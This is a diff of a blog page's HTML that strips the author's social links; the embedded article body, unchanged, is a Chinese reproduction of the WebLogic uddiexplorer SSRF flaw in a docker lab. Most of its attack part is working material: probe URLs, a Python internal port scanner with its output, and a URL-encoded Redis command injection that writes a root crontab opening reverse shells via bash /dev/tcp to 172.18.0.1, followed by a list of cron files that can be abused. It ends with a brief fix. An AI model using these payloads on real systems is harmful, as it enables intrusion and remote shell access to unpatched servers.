@@ -11,7 +11,7 @@
     
     
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"articleBody":"weblogic ssrf漏洞复现\n\n\n漏洞触发点在uddiexplorer/SearchPublicRegistries.jsp页面下，\n扫描内网 探测端口1/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001\n\n端口开放时 返回\n12345  An error has occurredweblogicuddi.client.structures.exception.XML_SoapException: The server at http://127.0.0.1:7001 returned a 404 error code (Not Found).  Please ensure that your URL is correct, and the web service has deployed without error.\n\n端口关闭时 返回\n1234An error has occurredweblogic.uddi.client.structures.exception.XML_SoapException: Tried all: &apos;1&apos; addresses, but could not connect over HTTP to server: &apos;127.0.0.1&apos;, port: &apos;7000&apos;\n\n探测协议这里使用dict协议探测端口时，显示未知协议\n12An error has occurredweblogic.uddi.client.structures.exception.XML_SoapException: unknown protocol: dict\n\n用file协议时，返回这个\n12An error has occurredjava.lang.ClassCastException: sun.net.www.protocol.file.FileURLConnection cannot be cast to java.net.HttpURLConnection\n\n看来只能使用http协议来探测了\n探测内网的ip地址和端口利用docker搭建的环境内网地址一般都是172开头~~\noperator=http://172.18.0.2:6379/\n返回\n1234An error has occurredweblogic.uddi.client.structures.exception.XML_SoapException: Received a response from url: http://172.18.0.2:6379 which did not have a valid SOAP content-type: null.\n\n和上面的有点不一样，在探测一个\noperator=http://172.18.0.2:22\n1234An error has occurredweblogic.uddi.client.structures.exception.XML_SoapException: Tried all: &apos;1&apos; addresses, but could not connect over HTTP to server: &apos;172.18.0.2&apos;, port: &apos;22&apos;\n\n那就证明了6379端口是开放的\nredis的默认端口就是6379，服务器可能有redis服务\n探测一下配置信息\noperator=http://172.18.0.2:6379/info\n1234An error has occurredweblogic.uddi.client.structures.exception.XML_SoapException: Received a response from url: http://172.18.0.2:6379/info which did not have a valid SOAP content-type: null.\n\n还是返回之前的内容，这里可能没有回显\n尝试了一下gopher协议，准备用gopher打内网redis，但是提示unknown protocol: gopher  哎gopher也不能用了，只能用http\n这里贴一下DOUBLE–R师傅的扫描脚本\n123456789101112131415161718192021222324252627282930313233343536373839404142# coding: utf-8# 'SSRF 扫描内网IP开放端口'import argparseimport threadimport timeimport reimport requestsdef ite_ip(ip):    for i in range(1,256):        final_ip = '&#123;ip&#125;.&#123;i&#125;'.format(ip=ip,i=i)        print final_ip        thread.start_new_thread(scan,(final_ip,))        time.sleep(3)def scan(final_ip):    ports = ('21', '22', '23', '53', '80', '135', '139', '443', '445', '1080', '1433', '1521', '3306', '3389', '4899', '8080', '7001', '8000','6389','6379')    for port in ports:        vul_url = args.url+'/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search' % (final_ip,port)        try:            r = requests.get(vul_url,timeout=15,verify=False)            result1 = re.findall('weblogic.uddi.client.structures.exception.XML_SoapException',r.content)            result2 = re.findall('but could not connect', r.content)            result3 = re.findall('No route to host', r.content)  #bugfix:此处进行优化，防止抛出no route to host类型错误            if len(result1) != 0 and len(result2) == 0 and len(result3) == 0:                print '[!]'+final_ip + ':' + port        except Exception, e:            passif __name__ == '__main__':    parser = argparse.ArgumentParser(description='Weblogic SSRF vulnerable exploit')    parser.add_argument('--url', dest='url', required=True, help='Target url')    # parser.add_argument('--ip', dest='scan_ip', help='IP to scan')    args = parser.parse_args()    # ip = '.'.join(args.scan_ip.split('.')[:-1])    ip = \"172.18.0\"       if ip:        print ip        ite_ip(ip)    else:        print \"no ip\"\n\n扫描结果\n123456789101112[root@vultr ~]# python neiwang.py --url 'http://149.28.209.214:7001'172.18.0172.18.0.1172.18.0.2[!]172.18.0.2:6379172.18.0.3172.18.0.4[!]172.18.0.3:7001172.18.0.5172.18.0.6172.18.0.7[!]172.18.0.1:22\n\n利用crontab定时任务，反弹shellredis是通过换行符（\\r\\n  url编码==&gt;%0d%0a），来分割命令的\n使用这三条命令反弹shell\n1234set 1 &quot;\\n\\n\\n\\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.18.0.1/21 0&gt;&amp;1\\n\\n\\n\\n&quot;config set dir /etc/config set dbfilename crontabsave\n\nurl编码一下\n1234&gt;&gt;&gt;import urllib&gt;&gt;&gt; s=&apos;&apos;&apos;set 1 &quot;\\n\\n\\n\\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.18.0.1/21 0&gt;&amp;1\\n\\n\\n\\n&quot;\\r\\nconfig set dir /etc/\\r\\nconfig set dbfilename crontab\\r\\nsave&apos;&apos;&apos;&gt;&gt;&gt; urllib.quote(s)&apos;set%201%20%22%0A%0A%0A%0A%2A%20%2A%20%2A%20%2A%20%2A%20root%20bash%20-i%20%3E%26%20/dev/tcp/172.18.0.1/21%200%3E%261%0A%0A%0A%0A%22%0D%0Aconfig%20set%20dir%20/etc/%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave&apos;\n\n在前后随便添加几个字符\n1test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa\n\n请求头如下\n123456GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://172.18.0.3:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa HTTP/1.1Host: localhostAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: close\n\n拿到shell\n\n本来想用这个来试一下的，这里好像多了一个换行符，我用了echo，echo好像会自动加一个换行符\n1*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$59%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.18.0.1/2333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$5%0d%0a/etc/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$7%0d%0acrontab%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a\n\n可以反弹shell的文件\n1234567/etc/crontab/etc/cron.d/*  将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell/var/spool/cron/root centos系统下root用户的cron文件/var/spool/cron/crontabs/root debian系统下root用户的cron文件\n\n漏洞修复123jar -xvf uddiexplorer.war rm jsp-files jar -cvfM uddiexplorer.war uddiexplorer/\n\n参考链接\nhttps://doubler.cn/2018/09/13/Vulhub-Weblogic-SSRF/\n","dateCreated":"2019-09-16T16:17:40+08:00","dateModified":"2019-09-16T20:43:49+08:00","datePublished":"2019-09-16T16:17:40+08:00","description":"weblogic ssrf漏洞复现","headline":"Weblogic+ssrf","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/16/Weblogic-ssrf/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"url":"http://yoursite.com/2019/09/16/Weblogic-ssrf/"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"weblogic ssrf漏洞复现\n\n\n漏洞触发点在uddiexplorer/SearchPublicRegistries.jsp页面下，\n扫描内网 探测端口1/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001\n\n端口开放时 返回\n12345  An error has occurredweblogicuddi.client.structures.exception.XML_SoapException: The server at http://127.0.0.1:7001 returned a 404 error code (Not Found).  Please ensure that your URL is correct, and the web service has deployed without error.\n\n端口关闭时 返回\n1234An error has occurredweblogic.uddi.client.structures.exception.XML_SoapException: Tried all: &apos;1&apos; addresses, but could not connect over HTTP to server: &apos;127.0.0.1&apos;, port: &apos;7000&apos;\n\n探测协议这里使用dict协议探测端口时，显示未知协议\n12An error has occurredweblogic.uddi.client.structures.exception.XML_SoapException: unknown protocol: dict\n\n用file协议时，返回这个\n12An error has occurredjava.lang.ClassCastException: sun.net.www.protocol.file.FileURLConnection cannot be cast to java.net.HttpURLConnection\n\n看来只能使用http协议来探测了\n探测内网的ip地址和端口利用docker搭建的环境内网地址一般都是172开头~~\noperator=http://172.18.0.2:6379/\n返回\n1234An error has occurredweblogic.uddi.client.structures.exception.XML_SoapException: Received a response from url: http://172.18.0.2:6379 which did not have a valid SOAP content-type: null.\n\n和上面的有点不一样，在探测一个\noperator=http://172.18.0.2:22\n1234An error has occurredweblogic.uddi.client.structures.exception.XML_SoapException: Tried all: &apos;1&apos; addresses, but could not connect over HTTP to server: &apos;172.18.0.2&apos;, port: &apos;22&apos;\n\n那就证明了6379端口是开放的\nredis的默认端口就是6379，服务器可能有redis服务\n探测一下配置信息\noperator=http://172.18.0.2:6379/info\n1234An error has occurredweblogic.uddi.client.structures.exception.XML_SoapException: Received a response from url: http://172.18.0.2:6379/info which did not have a valid SOAP content-type: null.\n\n还是返回之前的内容，这里可能没有回显\n尝试了一下gopher协议，准备用gopher打内网redis，但是提示unknown protocol: gopher  哎gopher也不能用了，只能用http\n这里贴一下DOUBLE–R师傅的扫描脚本\n123456789101112131415161718192021222324252627282930313233343536373839404142# coding: utf-8# 'SSRF 扫描内网IP开放端口'import argparseimport threadimport timeimport reimport requestsdef ite_ip(ip):    for i in range(1,256):        final_ip = '&#123;ip&#125;.&#123;i&#125;'.format(ip=ip,i=i)        print final_ip        thread.start_new_thread(scan,(final_ip,))        time.sleep(3)def scan(final_ip):    ports = ('21', '22', '23', '53', '80', '135', '139', '443', '445', '1080', '1433', '1521', '3306', '3389', '4899', '8080', '7001', '8000','6389','6379')    for port in ports:        vul_url = args.url+'/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search' % (final_ip,port)        try:            r = requests.get(vul_url,timeout=15,verify=False)            result1 = re.findall('weblogic.uddi.client.structures.exception.XML_SoapException',r.content)            result2 = re.findall('but could not connect', r.content)            result3 = re.findall('No route to host', r.content)  #bugfix:此处进行优化，防止抛出no route to host类型错误            if len(result1) != 0 and len(result2) == 0 and len(result3) == 0:                print '[!]'+final_ip + ':' + port        except Exception, e:            passif __name__ == '__main__':    parser = argparse.ArgumentParser(description='Weblogic SSRF vulnerable exploit')    parser.add_argument('--url', dest='url', required=True, help='Target url')    # parser.add_argument('--ip', dest='scan_ip', help='IP to scan')    args = parser.parse_args()    # ip = '.'.join(args.scan_ip.split('.')[:-1])    ip = \"172.18.0\"       if ip:        print ip        ite_ip(ip)    else:        print \"no ip\"\n\n扫描结果\n123456789101112[root@vultr ~]# python neiwang.py --url 'http://149.28.209.214:7001'172.18.0172.18.0.1172.18.0.2[!]172.18.0.2:6379172.18.0.3172.18.0.4[!]172.18.0.3:7001172.18.0.5172.18.0.6172.18.0.7[!]172.18.0.1:22\n\n利用crontab定时任务，反弹shellredis是通过换行符（\\r\\n  url编码==&gt;%0d%0a），来分割命令的\n使用这三条命令反弹shell\n1234set 1 &quot;\\n\\n\\n\\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.18.0.1/21 0&gt;&amp;1\\n\\n\\n\\n&quot;config set dir /etc/config set dbfilename crontabsave\n\nurl编码一下\n1234&gt;&gt;&gt;import urllib&gt;&gt;&gt; s=&apos;&apos;&apos;set 1 &quot;\\n\\n\\n\\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.18.0.1/21 0&gt;&amp;1\\n\\n\\n\\n&quot;\\r\\nconfig set dir /etc/\\r\\nconfig set dbfilename crontab\\r\\nsave&apos;&apos;&apos;&gt;&gt;&gt; urllib.quote(s)&apos;set%201%20%22%0A%0A%0A%0A%2A%20%2A%20%2A%20%2A%20%2A%20root%20bash%20-i%20%3E%26%20/dev/tcp/172.18.0.1/21%200%3E%261%0A%0A%0A%0A%22%0D%0Aconfig%20set%20dir%20/etc/%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave&apos;\n\n在前后随便添加几个字符\n1test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa\n\n请求头如下\n123456GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://172.18.0.3:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa HTTP/1.1Host: localhostAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: close\n\n拿到shell\n\n本来想用这个来试一下的，这里好像多了一个换行符，我用了echo，echo好像会自动加一个换行符\n1*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$59%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.18.0.1/2333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$5%0d%0a/etc/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$7%0d%0acrontab%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a\n\n可以反弹shell的文件\n1234567/etc/crontab/etc/cron.d/*  将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell/var/spool/cron/root centos系统下root用户的cron文件/var/spool/cron/crontabs/root debian系统下root用户的cron文件\n\n漏洞修复123jar -xvf uddiexplorer.war rm jsp-files jar -cvfM uddiexplorer.war uddiexplorer/\n\n参考链接\nhttps://doubler.cn/2018/09/13/Vulhub-Weblogic-SSRF/\n","dateCreated":"2019-09-16T16:17:40+08:00","dateModified":"2019-09-16T20:43:49+08:00","datePublished":"2019-09-16T16:17:40+08:00","description":"weblogic ssrf漏洞复现","headline":"Weblogic+ssrf","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/16/Weblogic-ssrf/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://yoursite.com/2019/09/16/Weblogic-ssrf/"}</script>
     <meta name="description" content="weblogic ssrf漏洞复现">
 <meta property="og:type" content="blog">
 <meta property="og:title" content="Weblogic+ssrf">
@@ -166,138 +166,6 @@
                         >
                         <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
                         <span class="sidebar-button-desc">关于</span>
-                    </a>
-            </li>
-            
-        </ul>
-        
-            <ul class="sidebar-buttons">
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://github.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="GitHub"
-                        >
-                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">GitHub</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="http://stackoverflow.com/users"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Stack Overflow"
-                        >
-                        <i class="sidebar-button-icon fab fa-stack-overflow" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Stack Overflow</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://twitter.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Twitter"
-                        >
-                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Twitter</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://facebook.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Facebook"
-                        >
-                        <i class="sidebar-button-icon fab fa-facebook" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Facebook</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://plus.google.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Google Plus"
-                        >
-                        <i class="sidebar-button-icon fab fa-google-plus" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Google Plus</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://www.linkedin.com/profile/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="LinkedIn"
-                        >
-                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">LinkedIn</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/mailto"
-                            
-                            rel="noopener"
-                            title="邮箱"
-                        >
-                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">邮箱</span>
-                    </a>
-            </li>
-            
-        </ul>
-        
-            <ul class="sidebar-buttons">
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/atom.xml"
-                            
-                            rel="noopener"
-                            title="RSS"
-                        >
-                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">RSS</span>
                     </a>
             </li>
             
